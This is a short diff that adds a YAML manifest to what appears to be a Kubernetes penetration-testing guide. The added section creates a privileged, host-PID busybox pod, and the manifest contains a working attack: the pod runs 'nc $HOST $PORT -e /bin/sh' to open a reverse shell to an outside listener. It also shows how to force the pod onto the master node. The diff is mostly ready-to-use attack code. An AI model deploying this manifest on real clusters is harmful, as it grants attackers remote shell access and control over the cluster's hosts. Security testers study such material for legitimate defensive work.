@@ -41,6 +41,27 @@ kubectl -n [namespace] exec -it pod-priv-only -- bash
 ```
 
 ## Or, create a reverse shell pod
+```yaml
+apiVersion: v1
+kind: Pod
+metadata:
+  name: pod-priv-and-hostpid-revshell
+  labels: 
+    app: priv-and-hostpid-revshell
+spec:
+  hostPID: true
+  containers:
+  - name: priv-and-hostpid-revshell
+    image: busybox
+    command: [ "/bin/sh", "-c", "--" ]
+    args: [ "nc $HOST $PORT  -e /bin/sh;" ]
+
+    securityContext:
+      privileged: true
+  # Force scheduling of your pod on master mode by uncommenting this line and changing the name
+  #nodeName: k8s-master
+  restartPolicy: Always
+```
 [pod-priv-only-revshell.yaml](pod-priv-only-revshell.yaml)
 
 #### Set up listener
